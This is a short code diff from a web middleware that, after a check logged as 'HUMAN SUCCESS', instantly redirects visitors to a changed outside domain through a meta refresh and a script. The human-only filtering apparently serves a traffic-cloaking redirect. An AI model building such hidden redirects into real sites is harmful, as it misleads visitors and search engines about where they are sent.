@@ -57,7 +57,7 @@ export default async function middleware(req) {
   // 7. SUCCESS REDIRECT & LOG
   console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname} | KEY=MATCH`);
   
-  const targetUrl = 'https://nusaindahrp.com/?dev';
+  const targetUrl = 'https://web02-atlas.nusaindahrp.com/?_adamsari';
   return new Response(
     `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
     {
